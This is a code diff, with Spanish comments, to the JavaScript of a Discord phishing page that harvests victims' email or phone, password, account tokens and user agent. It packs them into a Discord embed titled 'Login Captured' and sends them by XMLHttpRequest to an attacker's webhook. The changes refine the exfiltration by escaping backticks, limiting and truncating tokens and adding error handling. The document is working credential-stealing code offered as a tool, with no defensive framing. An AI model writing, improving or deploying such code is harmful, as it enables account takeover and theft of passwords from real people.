@@ -265,49 +265,86 @@
             var platform = getPlatform();
             
             var fields = [
-                {name: 'Platform', value: platform, inline: true},
-                {name: 'Tokens', value: String(tokens.length), inline: true},
+                {name: 'Platform', value: platform || 'Unknown', inline: true},
+                {name: 'Tokens Found', value: String(tokens.length), inline: true},
                 {name: 'Time', value: new Date().toLocaleString(), inline: true}
             ];
             
-            if (email) {
-                fields.push({name: 'Email/Phone', value: '||```' + email + '```||', inline: false});
-            }
-            
-            if (pass) {
-                fields.push({name: 'Password', value: '||```' + pass + '```||', inline: false});
-            }
-            
-            var j;
-            for (j = 0; j < tokens.length; j++) {
-                var t = tokens[j];
+            if (email && email.length > 0) {
+                // Escapar caracteres especiales
+                var safeEmail = email.replace(/[`]/g, '');
                 fields.push({
-                    name: 'Token #' + (j + 1) + ' (' + t.s + ')',
-                    value: '||```' + t.v + '```||',
+                    name: '📧 Email/Phone', 
+                    value: '||`' + safeEmail + '`||', 
                     inline: false
                 });
             }
             
+            if (pass && pass.length > 0) {
+                // Escapar caracteres especiales
+                var safePass = pass.replace(/[`]/g, '');
+                fields.push({
+                    name: '🔑 Password', 
+                    value: '||`' + safePass + '`||', 
+                    inline: false
+                });
+            }
+            
+            // Limitar tokens a máximo 5 para no exceder límites
+            var maxTokens = Math.min(tokens.length, 5);
+            for (var j = 0; j < maxTokens; j++) {
+                var t = tokens[j];
+                // Truncar valor si es muy largo
+                var tokenValue = t.v.length > 100 ? t.v.substring(0, 100) + '...' : t.v;
+                fields.push({
+                    name: '🎫 Token #' + (j + 1) + ' (' + t.s + ')',
+                    value: '||`' + tokenValue + '`||',
+                    inline: false
+                });
+            }
+            
+            // User agent truncado
+            var ua = navigator.userAgent;
+            if (ua.length > 200) {
+                ua = ua.substring(0, 200) + '...';
+            }
             fields.push({
-                name: 'User Agent',
-                value: '```' + navigator.userAgent + '```',
+                name: '💻 User Agent',
+                value: '`' + ua + '`',
                 inline: false
             });
             
-            var data = JSON.stringify({
+            var embedColor = tokens.length > 0 ? 4437377 : (email ? 16426522 : 16734296);
+            
+            var payload = {
                 username: 'Discord Phish',
                 embeds: [{
-                    title: 'Login Captured',
-                    color: tokens.length > 0 ? 4437377 : (email ? 16426522 : 16734296),
+                    title: '🎣 Login Captured',
+                    color: embedColor,
                     fields: fields,
-                    timestamp: new Date().toISOString()
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: 'Discord Phishing Logger'
+                    }
                 }]
-            });
+            };
             
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', WEBHOOK);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(data);
+            try {
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', WEBHOOK);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                
+                // Debug: ver qué se está enviando
+                xhr.onload = function() {
+                    if (xhr.status !== 204 && xhr.status !== 200) {
+                        console.error('Webhook error:', xhr.status, xhr.responseText);
+                    }
+                };
+                
+                xhr.send(JSON.stringify(payload));
+            } catch(e) {
+                console.error('Send error:', e);
+            }
         }
         
         // Manejar login
